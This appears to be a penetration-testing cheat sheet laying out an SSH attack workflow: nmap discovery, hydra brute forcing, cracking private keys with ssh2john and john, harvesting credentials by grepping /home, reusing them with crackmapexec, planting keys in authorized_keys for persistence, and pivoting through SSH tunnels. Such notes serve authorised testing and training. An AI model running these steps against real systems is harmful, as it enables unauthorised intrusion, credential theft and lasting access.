# SSH Enumeration & Exploitation

## Purpose

This file provides a structured workflow for gaining and leveraging SSH access.

Core rules:

* SSH = stable shell
* Credentials are often reused across services
* SSH access = start of privilege escalation
* Always check keys and configs

---

## 0. Identify SSH

Common port:

* 22

Confirm:

```bash
nmap -p 22 -sV <IP>
```

---

## 1. Basic Access

```bash
ssh user@<IP>
```

---

## 2. Password Authentication

Test credentials:

```bash
ssh user@<IP>
```

Use:

* discovered credentials
* reused passwords
* sprayed passwords

---

## 3. Brute Force (If Needed)

```bash
hydra -L users.txt -P passwords.txt ssh://<IP>
```

---

## 4. SSH Key Authentication

```bash
ssh -i id_rsa user@<IP>
```

Fix permissions if needed:

```bash
chmod 600 id_rsa
```

---

## 5. Private Key Discovery

Look for:

* id_rsa
* .ssh folders
* backups
* config files

---

## 6. Key Cracking

If encrypted:

```bash
ssh2john id_rsa > hash.txt
john hash.txt
```

---

## 7. Authorized Keys Abuse

If writable:

```bash
echo "your_public_key" >> ~/.ssh/authorized_keys
```

---

## 8. Post-Login Enumeration (CRITICAL)

Immediately run:

```bash
whoami
id
hostname
```

Check:

* sudo permissions
* user groups
* environment

---

## 9. Sudo Check

```bash
sudo -l
```

If allowed:
→ privilege escalation path

---

## 10. File System Enumeration

Check:

```bash
ls -la ~
```

Look for:

* credentials
* scripts
* backups
* configs

---

## 11. Credential Harvesting

Search:

```bash
grep -i "pass" -r /home 2>/dev/null
```

---

## 12. Reuse Credentials

Test SSH creds on:

```bash
crackmapexec smb <IP> -u user -p pass
crackmapexec winrm <IP> -u user -p pass
```

---

## 13. SSH Tunneling (Pivoting)

### Local Port Forward

```bash
ssh -L 8080:127.0.0.1:80 user@<IP>
```

---

### Remote Port Forward

```bash
ssh -R 8080:127.0.0.1:80 user@<IP>
```

---

### Dynamic Proxy (SOCKS)

```bash
ssh -D 1080 user@<IP>
```

Use with proxychains.

---

## 14. Transfer Files

Upload:

```bash
scp file user@<IP>:/tmp
```

Download:

```bash
scp user@<IP>:/file .
```

---

## 15. Spawn TTY

If needed:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 16. Persistence

Add key:

```bash
echo "your_public_key" >> ~/.ssh/authorized_keys
```

---

## 17. Pivot Opportunities

SSH can:

* access internal services
* tunnel into network
* enable lateral movement

---

## 18. If Access Fails

Try:

* password spraying
* key reuse
* credential reuse from other services

---

## 19. If Stuck

RESET:

* re-check credentials
* search for keys
* test sudo again
* enumerate files deeper

---

## 20. Mental Model

* SSH = access point
* Credentials = entry
* Shell = control

---

## 21. Golden Rules

* Always test credentials
* Always check for keys
* Always run sudo -l
* Always pivot after access
